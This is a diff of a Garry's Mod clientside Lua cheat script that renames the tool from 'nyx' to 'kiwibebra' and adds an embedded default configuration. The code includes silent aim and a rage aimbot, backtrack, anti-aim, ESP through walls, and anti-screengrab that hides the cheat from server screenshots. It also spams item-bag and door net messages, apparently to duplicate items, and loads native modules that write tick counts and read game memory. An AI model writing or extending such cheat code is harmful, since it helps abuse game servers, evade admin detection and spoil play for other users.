@@ -1,15 +1,15 @@
 --[[
-    nyx.lua  -  silent aim + bhop + directional autostrafe + player ESP, skeet-style menu
+    kiwibebra.lua  -  silent aim + bhop + directional autostrafe + player ESP, skeet-style menu
     Engine : Garry's Mod, clientside Lua (CreateMove / CalcView / HUDPaint / VGUI)
-    Run    : garrysmod/lua/autorun/client/nyx.lua   (loads on join)
-             or  sv_allowcslua 1  +  lua_openscript_cl nyx.lua
+    Run    : garrysmod/lua/autorun/client/kiwibebra.lua   (loads on join)
+             or  sv_allowcslua 1  +  lua_openscript_cl kiwibebra.lua
     Keys   : INSERT = menu, CTRL+F = function search (unload: Config tab button)
     Works on any GMod server / gamemode (no Rust-specific classes).
 ]]
 
-if NyxUnload then pcall(NyxUnload) end   -- re-running the file replaces the old instance
+if KiwibebraUnload then pcall(KiwibebraUnload) end   -- re-running the file replaces the old instance
 
-local ID = "nyx_"
+local ID = "kiwibebra_"
 local addedHooks = {}
 
 -- "a screengrab is being taken", defined with the anti-screengrab block; declared up here so
@@ -279,7 +279,7 @@ local cfg = {
         enabled = false,
         set     = "english",       -- english | russian | both | custom
         delay   = 0.6,             -- seconds after the kill
-        custom  = "",              -- set with the console command nyx_killsay <text> ({name} = victim)
+        custom  = "",              -- set with the console command kiwibebra_killsay <text> ({name} = victim)
     },
     world = {
         enabled    = false,        -- entity ESP over the whole map
@@ -322,7 +322,7 @@ local cfg = {
         skySolid   = false,        -- replace the sky with a flat colour
         solidR = 15, solidG = 18, solidB = 40,
         skyPic     = false,        -- your own picture wrapped around the sky
-        skyPicFile = "",           -- a file in data/nyx/bg/
+        skyPicFile = "",           -- a file in data/kiwibebra/bg/
         skyPicRot  = 0,            -- degrees per second the sky turns
         skyPicBright = 1,
     },
@@ -333,7 +333,7 @@ local cfg = {
         spin      = false,         -- the viewer turns on its own
         lit       = true,          -- studio light (off: the map's light where the entity stands)
         -- chams on entities picked in the list (right-click a row); which ones is kept in
-        -- data/nyx/entities.json, the look here
+        -- data/kiwibebra/entities.json, the look here
         chamMat   = "glow",
         chamR = 255, chamG = 140, chamB = 40,
         chamAlpha = 200,
@@ -382,13 +382,14 @@ local cfg = {
     },
     bagspam = {                    -- presses use on the nearest item bag, every tick
         enabled = false,
-        class   = "rust_itembag",  -- change with the console command  nyx_bag_class <class>
+        class   = "rust_itembag",  -- change with the console command  kiwibebra_bag_class <class>
         range   = 80,              -- units, the game's use reach is about 80
         aim     = true,            -- also turn (silently) onto the bag
         mode    = "rate",          -- none | rate (cl_cmdrate 128) | burst (cl_cmdrate low: uses go out in clumps) | net
         burstRate = 10,            -- cl_cmdrate while bursting
         netCount  = 10,            -- net mode: gRust.Interact messages sent in one frame
         netWait   = 1.0,           -- net mode: seconds before the same bag gets another burst
+        doorDupe  = false,         -- V: gRust.ToggleDoor at every bag
     },
     netlog = {                     -- logs the net messages you send (to see what a menu really sends)
         enabled  = false,
@@ -487,7 +488,7 @@ local cfg = {
     },
     xind = {                       -- indicators under the crosshair
         enabled  = false,
-        name     = "nyx",          -- the title line, shown as written (rename it in the menu)
+        name     = "kiwibebra",          -- the title line, shown as written (rename it in the menu)
         offset   = 22,             -- pixels under the crosshair
         state    = true,           -- STAND / MOVE / CROUCH / AIR
         minDamage = true,          -- the rage bot's minimum damage, top right of the crosshair
@@ -505,7 +506,7 @@ local cfg = {
         ms      = 150,             -- backtrack time: how far back (the server alone allows ~200 ms)
         draw    = true,            -- dots on the records of the aim target
         -- from ultimate ----------------------------------------------------------------------
-        mode    = "newest",        -- newest (nyx: newest first) | last (ultimate "Last ticks": the
+        mode    = "newest",        -- newest (kiwibebra: newest first) | last (ultimate "Last ticks": the
                                    -- oldest hittable one) | closest (nearest to you) | scan (every
                                    -- one, oldest first, until one is in the open)
         extended = false,          -- module v6: records past the server's window, through a
@@ -625,7 +626,19 @@ local cfg = {
         h     = 520,
         x     = -1,                -- where the window was last (-1: centred)
         y     = -1,
-        layout = "",               -- groups moved by dragging their title (JSON: tab -> columns -> titles)
+        -- groups moved by dragging their title (JSON: tab -> columns -> titles); the default is the
+        -- arranged layout, "Reset group layout" goes back to it
+        layout = util.TableToJSON({
+            tab1 = {left = {"Rage aimbot"}, right = {"Hitboxes", "Target selection", "Filters"}},
+            tab2 = {left = {"Anti-aim", "Pitch", "Animation (local)"}, right = {"Yaw", "Modifier", "Manual yaw", "Fake lag"}},
+            tab3 = {left = {"Aimbot", "Filters", "Indicators"}, right = {"Hitbox", "Target selection", "Accuracy"}},
+            tab4 = {
+                left = {"Players", "Chams", "Tracers", "Hits", "Glow", "Custom model"},
+                right = {"Camera", "Viewmodel", "Removals", "World", "Crosshair indicators", "Rain", "Kill effects"},
+            },
+            tab5 = {left = {"Bunny hop", "Edge bug"}, right = {"Practice", "Autostrafe", "Circle strafe", "Airstuck", "Network"}},
+            tab6 = {left = {"Anti screengrab", "Watermark", "HUD lists", "Menu"}, right = {"Taunt spam", "Item bags", "Net logger", "Killsay"}},
+        }),
     },
     indicator = {                  -- speed number + short names of the active binds, under the crosshair
         enabled   = true,
@@ -649,7 +662,7 @@ local cfg = {
         xPct    = 1,
         yPct    = 22,
     },
-    media = {                      -- media player: what Windows plays (Chrome, Spotify, ...), needs gmcl_nyx v2
+    media = {                      -- media player: what Windows plays (Chrome, Spotify, ...), needs gmcl_kiwibebra v2
         enabled  = false,
         x = -1, y = -1,            -- pixels, -1 = top centre
         w = 420, h = 96,           -- dragged with the corner while the cursor is out
@@ -660,7 +673,7 @@ local cfg = {
     },
     bg = {                         -- animated picture behind the menu
         enabled = false,           -- off until switched on (or a picture is picked) in the menu
-        file    = "nyx_wave.jpg",  -- a file in data/nyx/bg/
+        file    = "kiwibebra_wave.jpg",  -- a file in data/kiwibebra/bg/
         opacity = 0.45,
         mode    = "both",          -- static | drift | pulse | both
         speed   = 1,
@@ -671,7 +684,7 @@ local cfg = {
         enabled    = true,
         style      = "bar",        -- bar | skeet
         corner     = "tr",         -- tl | tr | bl | br
-        name       = "nyx",
+        name       = "kiwibebra",
         info       = false,        -- second panel: angle difference, loss, ping / tickrate
         showUser   = true,
         showServer = true,
@@ -683,11 +696,870 @@ local cfg = {
     },
     misc = {
         antiSS = true,             -- hide every cheat visual from screengrabs
+        ssAlert   = true,          -- notice when the server grabs your screen
+        ssSound   = true,          -- shutter sound on a grab
+        ssPreview = true,          -- save the grab to data/kiwibebra/grabs/ and show it on screen
     },
 }
 
+-- Built-in defaults: config_1 (saved 2026-10-17 00:16). Its values are laid over the table above when
+-- the file loads, before anything copies cfg - so a fresh start, "Reset all to defaults" and
+-- "Reset group layout" all come back to it. Only keys that exist above with the same type are
+-- taken (the same rule as loading a config), so a setting added later keeps its own default.
+do
+    local DEFAULT_CONFIG = [==[
+{
+	"cfg": {
+		"taunt": {
+			"move": true,
+			"hideFirst": true,
+			"enabled": false,
+			"name": "dance",
+			"interval": 1
+		},
+		"extrap": {
+			"lcBreak": true,
+			"strafe": true,
+			"maxTicks": 32,
+			"g": 200,
+			"projectile": "auto",
+			"draw": false,
+			"b": 255,
+			"bhop": true,
+			"r": 80,
+			"projSpeed": 3500,
+			"projGravity": 0
+		},
+		"free": {
+			"enabled": false,
+			"boost": 3,
+			"speed": 700
+		},
+		"seq": {
+			"index": 0,
+			"enabled": false
+		},
+		"xind": {
+			"features": true,
+			"minDamage": true,
+			"g": 216,
+			"b": 150,
+			"offset": 25,
+			"r": 155,
+			"enabled": true,
+			"name": "kiwibebra",
+			"state": false
+		},
+		"resolver": {
+			"step": 45,
+			"reset": 6,
+			"pitch": false,
+			"memoryTime": 180,
+			"memoryMisses": 2,
+			"enabled": false,
+			"mode": "step",
+			"memory": true
+		},
+		"aim": {
+			"humanizeOn": false,
+			"smooth": 6,
+			"sticky": true,
+			"maxDist": 300,
+			"extrapOn": false,
+			"predict": 3,
+			"drawTarget": true,
+			"priority": "fov",
+			"fireOnly": true,
+			"drawFov": true,
+			"fallback": true,
+			"visCheck": true,
+			"humanize": 2,
+			"silent": true,
+			"teamCheck": false,
+			"predictOn": false,
+			"recoil": 1,
+			"recoilOn": false,
+			"ignoreFriends": true,
+			"targetOnly": false,
+			"autoFire": false,
+			"hitbox": "head",
+			"enabled": false,
+			"key": 108,
+			"fov": 8
+		},
+		"backtrack": {
+			"draw": true,
+			"ms": 150,
+			"always": false,
+			"ignoreBreakLC": false,
+			"enabled": false,
+			"mode": "newest",
+			"extended": false
+		},
+		"misc": {
+			"antiSS": true,
+			"ssPreview": true,
+			"ssSound": true,
+			"ssAlert": true
+		},
+		"tracers": {
+			"b": 97,
+			"width": 3,
+			"life": 0.8,
+			"enabled": true,
+			"r": 97,
+			"g": 97
+		},
+		"killfx": {
+			"burst": false,
+			"scale": 1,
+			"count": 36,
+			"b": 255,
+			"life": 2,
+			"souls": false,
+			"dsCount": 280,
+			"g": 255,
+			"ghost": false,
+			"fireworks": false,
+			"banner": false,
+			"rainbow": false,
+			"r": 255,
+			"ragdoll": "off",
+			"pillar": false,
+			"sparks": false,
+			"dome": false,
+			"dsTint": true,
+			"flash": false,
+			"dsBeam": false,
+			"ring": false,
+			"vortex": false,
+			"dsHide": true,
+			"text": false,
+			"disint": true,
+			"scorch": false,
+			"shake": false,
+			"bolt": false,
+			"sound": "off",
+			"enabled": true,
+			"confetti": false,
+			"hitmarker": false
+		},
+		"bagspam": {
+			"netWait": 1,
+			"class": "rust_itembag",
+			"mode": "rate",
+			"aim": true,
+			"netCount": 10,
+			"doorDupe": false,
+			"enabled": false,
+			"burstRate": 10,
+			"range": 80
+		},
+		"tpose": {
+			"includeSelf": true,
+			"enabled": false
+		},
+		"killsay": {
+			"custom": "",
+			"enabled": false,
+			"delay": 0.6,
+			"set": "english"
+		},
+		"aa": {
+			"flMode": "adaptive",
+			"flOffShooting": true,
+			"indicator": true,
+			"realOnShoot": true,
+			"fakelag": false,
+			"sameForAll": true,
+			"offOnUse": true,
+			"manualBack": false,
+			"states": {
+				"stand": {
+					"yawOffset": 180,
+					"noise": 0,
+					"modSpeed": 360,
+					"modInterval": 1,
+					"pitchValue": 89,
+					"roll": 0,
+					"yawMod": "jitter",
+					"pitchMode": "down",
+					"modRange": 30,
+					"switchOffset": -90,
+					"yawBase": "view"
+				},
+				"air": {
+					"yawOffset": 180,
+					"noise": 0,
+					"modSpeed": 360,
+					"modInterval": 1,
+					"pitchValue": 89,
+					"roll": 0,
+					"yawMod": "jitter",
+					"pitchMode": "down",
+					"modRange": 30,
+					"switchOffset": -90,
+					"yawBase": "view"
+				},
+				"move": {
+					"yawOffset": 180,
+					"noise": 0,
+					"modSpeed": 360,
+					"modInterval": 1,
+					"pitchValue": 89,
+					"roll": 0,
+					"yawMod": "jitter",
+					"pitchMode": "down",
+					"modRange": 30,
+					"switchOffset": -90,
+					"yawBase": "view"
+				}
+			},
+			"lbyInterval": 1.1,
+			"sel": "stand",
+			"onShot": false,
+			"hideShots": false,
+			"manualLeft": false,
+			"offWithTools": true,
+			"manualRight": false,
+			"desync": false,
+			"hideRate": 20,
+			"flChoke": 6,
+			"enabled": false,
+			"lby": false,
+			"lbyDelta": 120
+		},
+		"model": {
+			"self": false,
+			"others": false,
+			"teamCheck": false,
+			"selfModel": "models/player/kleiner.mdl",
+			"othersModel": "models/player/combine_soldier.mdl"
+		},
+		"btchams": {
+			"step": 3,
+			"throughWalls": true,
+			"mode": "aim",
+			"g": 170,
+			"b": 255,
+			"material": "flat",
+			"targetOnly": false,
+			"alpha": 110,
+			"r": 120,
+			"enabled": false
+		},
+		"practice": {
+			"angles": true,
+			"saveKey": 0,
+			"enabled": false,
+			"tpKey": 0,
+			"marker": true
+		},
+		"vm": {
+			"fovOn": false,
+			"x": 3.3,
+			"y": 1.5,
+			"fov": 94,
+			"offsetOn": true,
+			"z": -1.5
+		},
+		"espl": {
+			"flags": {
+				"side": "right",
+				"order": 1
+			},
+			"money": {
+				"side": "off",
+				"order": 3
+			},
+			"ping": {
+				"side": "off",
+				"order": 7
+			},
+			"hp": {
+				"side": "left",
+				"order": 2
+			},
+			"armor": {
+				"side": "off",
+				"order": 2
+			},
+			"hpbar": {
+				"side": "left",
+				"order": 1
+			},
+			"armorbar": {
+				"side": "off",
+				"order": 1
+			},
+			"ammobar": {
+				"side": "off",
+				"order": 4
+			},
+			"ammo": {
+				"side": "off",
+				"order": 3
+			},
+			"group": {
+				"side": "off",
+				"order": 2
+			},
+			"job": {
+				"side": "bottom",
+				"order": 1
+			},
+			"distance": {
+				"side": "bottom",
+				"order": 4
+			},
+			"name": {
+				"side": "top",
+				"order": 1
+			},
+			"weapon": {
+				"side": "bottom",
+				"order": 3
+			}
+		},
+		"espc": {
+			"flags": {
+				"r": 255,
+				"auto": false,
+				"b": 70,
+				"g": 190
+			},
+			"money": {
+				"r": 120,
+				"auto": false,
+				"b": 120,
+				"g": 255
+			},
+			"name": {
+				"r": 255,
+				"auto": true,
+				"b": 255,
+				"g": 255
+			},
+			"ping": {
+				"r": 180,
+				"auto": false,
+				"b": 180,
+				"g": 180
+			},
+			"box": {
+				"r": 255,
+				"auto": true,
+				"b": 255,
+				"g": 255
+			},
+			"armor": {
+				"r": 110,
+				"auto": false,
+				"b": 255,
+				"g": 170
+			},
+			"hp": {
+				"r": 255,
+				"auto": true,
+				"b": 255,
+				"g": 255
+			},
+			"hpbar": {
+				"r": 90,
+				"auto": true,
+				"b": 90,
+				"g": 255
+			},
+			"ammobar": {
+				"r": 255,
+				"auto": false,
+				"b": 60,
+				"g": 200
+			},
+			"ammo": {
+				"r": 255,
+				"auto": false,
+				"b": 120,
+				"g": 220
+			},
+			"group": {
+				"r": 255,
+				"auto": false,
+				"b": 120,
+				"g": 120
+			},
+			"job": {
+				"r": 200,
+				"auto": false,
+				"b": 255,
+				"g": 200
+			},
+			"distance": {
+				"r": 255,
+				"auto": true,
+				"b": 255,
+				"g": 255
+			},
+			"armorbar": {
+				"r": 70,
+				"auto": false,
+				"b": 255,
+				"g": 140
+			},
+			"weapon": {
+				"r": 255,
+				"auto": true,
+				"b": 255,
+				"g": 255
+			}
+		},
+		"speclist": {
+			"enabled": true,
+			"xPct": 1,
+			"yPct": 22
+		},
+		"menu": {
+			"x": 950,
+			"anim": true,
+			"w": 934,
+			"y": 194,
+			"h": 1246,
+			"layout": "{\"tab4\":{\"right\":[\"Camera\",\"Viewmodel\",\"Removals\",\"World\",\"Rain\",\"Kill effects\",\"Glow\"],\"left\":[\"Players\",\"Chams\",\"Tracers\",\"Hits\",\"Crosshair indicators\",\"Custom model\"]}}",
+			"speed": 0.8
+		},
+		"bg": {
+			"twinkle": true,
+			"file": "kiwibebra_wave.jpg",
+			"mode": "both",
+			"g": 255,
+			"b": 255,
+			"r": 255,
+			"enabled": false,
+			"speed": 1,
+			"opacity": 0.45
+		},
+		"view": {
+			"fovOn": false,
+			"fov": 105,
+			"aspect": 1.49,
+			"aspectOn": false,
+			"thirdperson": false,
+			"distance": 90,
+			"height": 0,
+			"shoulder": 0
+		},
+		"world": {
+			"skyR": 255,
+			"skyG": 255,
+			"door": false,
+			"fogEnd": 9262,
+			"solidB": 40,
+			"skyTint": false,
+			"distance": true,
+			"timeCycle": false,
+			"skySolid": false,
+			"night": false,
+			"fogB": 100,
+			"skyPicRot": 0,
+			"glow": false,
+			"timeSpeed": 10,
+			"nightAmount": 0.33,
+			"fogG": 99,
+			"prop": false,
+			"enabled": false,
+			"solidR": 15,
+			"timeScreen": false,
+			"solidG": 18,
+			"noFog": false,
+			"maxDist": 2000,
+			"fogDensity": 1,
+			"npc": true,
+			"item": true,
+			"weapon": true,
+			"timeOn": false,
+			"timeHour": 1,
+			"skyPicBright": 1,
+			"other": true,
+			"skyPicFile": "",
+			"skyPic": false,
+			"name": true,
+			"fogStart": 2812,
+			"vehicle": true,
+			"skyB": 255,
+			"fogOn": false,
+			"fogR": 98,
+			"box": true,
+			"fullbright": false,
+			"nightScreen": false,
+			"skyPreset": "default"
+		},
+		"entview": {
+			"espDist": true,
+			"searchNW": false,
+			"spin": false,
+			"espBox": true,
+			"highlight": true,
+			"showPlayers": false,
+			"espMax": 1000,
+			"chamG": 140,
+			"chamWalls": true,
+			"espR": 90,
+			"espG": 220,
+			"lit": true,
+			"espName": true,
+			"chamB": 40,
+			"espHealth": true,
+			"filter": "all",
+			"espGlow": false,
+			"espB": 255,
+			"espLine": false,
+			"live": true,
+			"chamMat": "glow",
+			"chamAlpha": 200,
+			"chamR": 255
+		},
+		"watermark": {
+			"showTime": true,
+			"showPing": true,
+			"showFps": true,
+			"g": 184,
+			"style": "skeet",
+			"showServer": true,
+			"b": 6,
+			"r": 149,
+			"showTick": true,
+			"corner": "tr",
+			"showUser": true,
+			"enabled": true,
+			"name": "kiwibebra",
+			"info": false
+		},
+		"media": {
+			"x": 77,
+			"cover": true,
+			"y": 105,
+			"app": true,
+			"w": 364,
+			"autoHide": true,
+			"enabled": true,
+			"h": 113,
+			"opacity": 90
+		},
+		"zx": {
+			"animFix": true,
+			"predict": true,
+			"noInterp": true,
+			"enabled": true,
+			"noSeqInterp": true
+		},
+		"keylist": {
+			"yPct": 35,
+			"enabled": true,
+			"xPct": 1,
+			"showInactive": false
+		},
+		"rain": {
+			"width": 1.2,
+			"splash": true,
+			"length": 32,
+			"style": "streak",
+			"speed": 900,
+			"b": 225,
+			"speedVar": 0.25,
+			"r": 170,
+			"windYaw": 45,
+			"gust": 0.3,
+			"count": 1500,
+			"volume": 0.6,
+			"wind": 120,
+			"g": 190,
+			"radius": 700,
+			"splashSize": 7,
+			"roof": true,
+			"darken": 0.15,
+			"sound": "off",
+			"enabled": false,
+			"a": 120,
+			"height": 500
+		},
+		"norecoil": {
+			"exceptions": true,
+			"scale": 1,
+			"enabled": false
+		},
+		"removals": {
+			"fog": false,
+			"viewmodel": false,
+			"hudDamage": true,
+			"shells": false,
+			"hudWeapons": false,
+			"shake": true,
+			"hudPickup": false,
+			"motionBlur": false,
+			"hudHealth": false,
+			"hudAmmo": false,
+			"bob": true,
+			"hudCrosshair": false,
+			"ragdolls": false,
+			"punch": true,
+			"enabled": true,
+			"hudKillfeed": false,
+			"decals": false
+		},
+		"indicator": {
+			"scale": 1,
+			"gainColor": false,
+			"yPct": 72,
+			"g": 158,
+			"b": 158,
+			"allBinds": false,
+			"speed": true,
+			"r": 158,
+			"enabled": true,
+			"binds": true,
+			"bindScale": 1
+		},
+		"esp": {
+			"hpHideFull": false,
+			"health": true,
+			"hpG": 255,
+			"b": 255,
+			"maxDist": 4000,
+			"hpPos": "follow",
+			"distance": true,
+			"weapon": true,
+			"dormantTime": 8,
+			"dormant": true,
+			"r": 255,
+			"teamCheck": false,
+			"teamColor": true,
+			"g": 255,
+			"hpR": 255,
+			"hpB": 255,
+			"hpText": true,
+			"hpColor": "bar",
+			"box": false,
+			"enabled": true,
+			"name": true,
+			"hpPercent": false
+		},
+		"move": {
+			"circleMinSpeed": 40,
+			"circleAvoid": true,
+			"circleSide": "left",
+			"asMax": 4,
+			"psAlign": true,
+			"psBudget": 60,
+			"airstuck": false,
+			"longjump": false,
+			"esTicks": 12,
+			"psfInset": 0.02197,
+			"mjHoldDuck": false,
+			"psfRange": 64,
+			"psHelperRange": 500,
+			"tbBudget": 150,
+			"psSearch": true,
+			"psHelperTicks": 64,
+			"fmBhop": true,
+			"psCalcKey": 81,
+			"psCalcHud": true,
+			"psfStep": 16,
+			"tbBothDuck": true,
+			"ebLines": 12,
+			"psReach": 16,
+			"psCalc": false,
+			"psfLiveWidth": 128,
+			"minijump": false,
+			"psfLive": true,
+			"tbWiggle": 3,
+			"psfKey": 24,
+			"strafeMode": "directional",
+			"tbFwd1": 0.1,
+			"ebSteer": false,
+			"ebDraw": true,
+			"psFinder": false,
+			"edgeskip": false,
+			"ebTicks": 32,
+			"tbAhead": 3,
+			"ebFanEvery": 2,
+			"psfBudget": 3,
+			"edgebug": false,
+			"psHelper": false,
+			"psGain": true,
+			"pixelsurf": false,
+			"whApproach": 6,
+			"tbZStep": 6,
+			"tbHug": 0.5,
+			"ebTurnScale": 1,
+			"simQuads": false,
+			"psTicks": 16,
+			"fireman": false,
+			"tbAngleStart": 0,
+			"ebSpread": 180,
+			"tbFwd2": 0.25,
+			"circle": false,
+			"tbAngleEnd": 90,
+			"texturebug": false,
+			"ebIndicator": true,
+			"ebAdvanced": true,
+			"autostrafe": false,
+			"bhop": true,
+			"ebLock": 0.6,
+			"esMax": 1,
+			"wallhang": false
+		},
+		"nospread": {
+			"enabled": true
+		},
+		"hits": {
+			"g": 255,
+			"logMiss": true,
+			"marker": true,
+			"b": 255,
+			"r": 255,
+			"logTime": 5,
+			"numbers": true,
+			"sound": "off",
+			"console": true,
+			"world": true,
+			"logs": true
+		},
+		"glow": {
+			"selfR": 80,
+			"width": 2,
+			"throughWalls": true,
+			"teamCheck": false,
+			"g": 80,
+			"b": 80,
+			"self": false,
+			"r": 255,
+			"enabled": false,
+			"selfG": 180,
+			"selfB": 255
+		},
+		"chams": {
+			"self": false,
+			"handR": 255,
+			"handB": 60,
+			"selfAlpha": 200,
+			"handG": 140,
+			"players": true,
+			"material": "crystal",
+			"visR": 148,
+			"hidG": 111,
+			"hidR": 111,
+			"selfB": 255,
+			"selfR": 90,
+			"visB": 148,
+			"handAlpha": 254,
+			"hidB": 111,
+			"teamCheck": false,
+			"edit": "players",
+			"weapon": false,
+			"selfMaterial": "shield",
+			"selfG": 160,
+			"hands": false,
+			"handMaterial": "glow",
+			"alpha": 254,
+			"enabled": false,
+			"throughWalls": true,
+			"visG": 148
+		},
+		"netlog": {
+			"incoming": false,
+			"print": true,
+			"enabled": false
+		},
+		"interp": {
+			"mode": "default"
+		},
+		"rage": {
+			"wall": {
+				"wood": true,
+				"other": true,
+				"plastic": true,
+				"glass": true,
+				"metal": false,
+				"dirt": true,
+				"concrete": false,
+				"thin": true,
+				"tile": true
+			},
+			"minDamage": 0,
+			"ignoreGod": false,
+			"multipoint": false,
+			"ignoreVehicle": false,
+			"mpLimbs": false,
+			"mpScale": 0.75,
+			"drawTarget": false,
+			"predictOn": false,
+			"extrapOn": false,
+			"drawFov": true,
+			"maxTargets": 0,
+			"legs": false,
+			"teamCheck": false,
+			"ignoreNoclip": false,
+			"recoilOn": true,
+			"mpBody": true,
+			"autoStop": false,
+			"enabled": false,
+			"weaponWall": true,
+			"autoReload": true,
+			"predict": 3,
+			"autowall": false,
+			"recoil": 1,
+			"realHitboxes": true,
+			"bodyBelow": 0,
+			"ignoreBots": false,
+			"head": true,
+			"minDmgOverride": false,
+			"maxDist": 500,
+			"fovR": 232,
+			"minDmgOverrideValue": 1,
+			"skipReload": true,
+			"ignoreNodraw": false,
+			"priority": "distance",
+			"ignoreFriends": true,
+			"ignoreAdmins": false,
+			"fov": 7,
+			"fovB": 232,
+			"holdFire": true,
+			"mpHead": true,
+			"fovG": 232,
+			"visOnly": true,
+			"ignoreFrozen": false,
+			"chest": true,
+			"autoFire": true,
+			"targetOnly": false,
+			"wallCount": 2,
+			"pelvis": false,
+			"arms": false,
+			"wallPower": 40,
+			"forceBaim": false
+		}
+	},
+	"version": 1,
+	"binds": []
+}
+]==]
+
+    local function Lay(dst, src)
+        for k, v in pairs(src) do
+            local cur = dst[k]
+            if type(cur) == "table" and type(v) == "table" then
+                Lay(cur, v)
+            elseif cur ~= nil and type(cur) == type(v) then
+                dst[k] = v
+            end
+        end
+    end
+
+    local t = util.JSONToTable(DEFAULT_CONFIG)
+    if istable(t) and istable(t.cfg) then Lay(cfg, t.cfg) end
+end
+
 -- Anti-target list ("friends"): players the aimbots never pick. Keyed by SteamID64 (the nick for
--- bots); everything lives in data/nyx/players.json and is managed by the Players tab.
+-- bots); everything lives in data/kiwibebra/players.json and is managed by the Players tab.
 local FR = {
     list = {},           -- friends:   key -> {name}   never targeted
     targets = {},        -- targets:   key -> {name}   red, preferred, the only ones in "target only"
@@ -945,21 +1817,21 @@ end
 local BT = {recs = setmetatable({}, {__mode = "k"}), lastTick = -1}
 
 -- native module ---------------------------------------------------------------------------
--- gmcl_nyx (lua/bin/gmcl_nyx_win64.dll or _win32.dll) is optional. With it: real packet choke
+-- gmcl_kiwibebra (lua/bin/gmcl_kiwibebra_win64.dll or _win32.dll) is optional. With it: real packet choke
 -- (fake lag, desync, LBY breaker, airstuck), tick_count writes and simulation times (backtrack
 -- by server tick, fakelag extrapolation). Without it everything falls back to the Lua ways.
 -- Each part is checked before use: the CUserCmd layout against what Lua reads from the same
 -- command, the net channel by its address, the netvar reader against Health().
 -- The state lives in BT.M (the main chunk is at Lua's 200 locals).
-if not istable(nyxmod) then
-    local installed = not util.IsBinaryModuleInstalled or util.IsBinaryModuleInstalled("nyx")
-    if installed then pcall(require, "nyx") end
+if not istable(kiwibebramod) then
+    local installed = not util.IsBinaryModuleInstalled or util.IsBinaryModuleInstalled("kiwibebra")
+    if installed then pcall(require, "kiwibebra") end
 end
 
 -- zxcmodule (github.com/m4tt13/zxcmodule, lua/bin/gmcl_zxcmodule_win64.dll): its ded.* is used
 -- first for everything it covers - choke through bSendPacket, tick writes, simulation times,
 -- latency, net_SetConVar, spread prediction, engine prediction, interpolation and the anim fix.
--- gmcl_nyx stays the fallback for all of it.
+-- gmcl_kiwibebra stays the fallback for all of it.
 if not istable(ded) then
     local installed = not util.IsBinaryModuleInstalled or util.IsBinaryModuleInstalled("zxcmodule")
     if installed then pcall(require, "zxcmodule") end
@@ -978,16 +1850,16 @@ BT.M = {
 BT.simHist = setmetatable({}, {__mode = "k"})          -- player -> {sim, prev}
 
 function BT.HasMod()
-    return istable(nyxmod)
+    return istable(kiwibebramod)
 end
 
 -- once per command until it works: find tick_count / random_seed inside CUserCmd
 function BT.ProbeCmd(cmd)
     local m = BT.M
-    if m.cmd ~= nil or not istable(nyxmod) or cmd:CommandNumber() == 0 then return end
+    if m.cmd ~= nil or not istable(kiwibebramod) or cmd:CommandNumber() == 0 then return end
 
     m.cmdTries = m.cmdTries + 1
-    local ok, info = nyxmod.CmdProbe(cmd, cmd:CommandNumber(), cmd.TickCount and cmd:TickCount() or nil, cmd:GetForwardMove())
+    local ok, info = kiwibebramod.CmdProbe(cmd, cmd:CommandNumber(), cmd.TickCount and cmd:TickCount() or nil, cmd:GetForwardMove())
 
     if ok then
         m.cmd, m.cmdMsg = true, "ok (offset " .. tostring(info) .. ")"
@@ -1001,12 +1873,12 @@ function BT.NetCheck()
     if BT.ZX() then return true end
 
     local m = BT.M
-    if not istable(nyxmod) then return false end
+    if not istable(kiwibebramod) then return false end
 
     local now = RealTime()
     if now >= m.netNext then
         m.netNext = now + 2
-        local ok, msg = nyxmod.NetInit(game.GetIPAddress())
+        local ok, msg = kiwibebramod.NetInit(game.GetIPAddress())
         m.net, m.netMsg = ok and true or false, tostring(msg)
     end
 
@@ -1014,7 +1886,7 @@ function BT.NetCheck()
 end
 
 function BT.NetReady()
-    return BT.ZX() or (istable(nyxmod) and BT.M.net)
+    return BT.ZX() or (istable(kiwibebramod) and BT.M.net)
 end
 
 -- zxcmodule choke: whether this command goes out is decided once at the start of the tick
@@ -1044,12 +1916,12 @@ function BT.NetSet(name, value)
         ded.NetSetConVar(name, value)
         return true, "ok (zxcmodule)"
     end
-    if istable(nyxmod) and BT.M.net and nyxmod.NetSetConVar then return nyxmod.NetSetConVar(name, value) end
+    if istable(kiwibebramod) and BT.M.net and kiwibebramod.NetSetConVar then return kiwibebramod.NetSetConVar(name, value) end
     return false, "no module"
 end
 
 function BT.HasNetSet()
-    return BT.ZX() or (istable(nyxmod) and BT.M.net and nyxmod.NetSetConVar ~= nil)
+    return BT.ZX() or (istable(kiwibebramod) and BT.M.net and kiwibebramod.NetSetConVar ~= nil)
 end
 
 function BT.ZXStatus()
@@ -1062,7 +1934,7 @@ end
 function BT.WillSend()
     if BT.ZX() then return BT.zsend end
     if not BT.NetReady() then return true end
-    return nyxmod.WillSend()
+    return kiwibebramod.WillSend()
 end
 
 -- ultimate's interp backtrack: the server lag-compensates a shot to tick - its cl_interp, and
@@ -1099,7 +1971,7 @@ function BT.RestoreInterp()
 end
 
 function BT.ExtStatus()
-    if not BT.HasNetSet() then return "extended: needs zxcmodule or gmcl_nyx v6" end
+    if not BT.HasNetSet() then return "extended: needs zxcmodule or gmcl_kiwibebra v6" end
     if BT.extBroken then return "extended: SendNetMsg failed, off" end
     return "server cl_interp: " .. (BT.sent.cl_interp or "real")
 end
@@ -1127,7 +1999,7 @@ function BT.SetTick(cmd, tick)
         return true
     end
 
-    if istable(nyxmod) and BT.M.cmd then return nyxmod.SetTickCount(cmd, tick) end
+    if istable(kiwibebramod) and BT.M.cmd then return kiwibebramod.SetTickCount(cmd, tick) end
     return false
 end
 
@@ -1150,14 +2022,14 @@ function BT.SimTime(v)
     end
 
     local m = BT.M
-    if not istable(nyxmod) or m.ent == false then return nil end
+    if not istable(kiwibebramod) or m.ent == false then return nil end
 
     local idx = v:EntIndex()
 
     if m.ent == nil then
         -- one check before trusting the reader: m_iHealth must read what Lua says
-        local off = nyxmod.Netvar(idx, "m_iHealth")
-        local hp = off and nyxmod.ReadInt(idx, off)
+        local off = kiwibebramod.Netvar(idx, "m_iHealth")
+        local hp = off and kiwibebramod.ReadInt(idx, off)
         if hp == nil then return nil end            -- entity not ready, try again later
 
         m.ent = hp == v:Health()
@@ -1165,7 +2037,7 @@ function BT.SimTime(v)
         if not m.ent then return nil end
     end
 
-    local sim = nyxmod.SimTime(idx)
+    local sim = kiwibebramod.SimTime(idx)
     if not sim then return nil end
 
     local h = BT.simHist[v]
@@ -1192,7 +2064,7 @@ end
 -- one-way latency to the server
 function BT.Latency(ply)
     local l
-    if BT.ZX() then l = ded.GetLatency(0) elseif BT.NetReady() then l = nyxmod.Latency(0) end
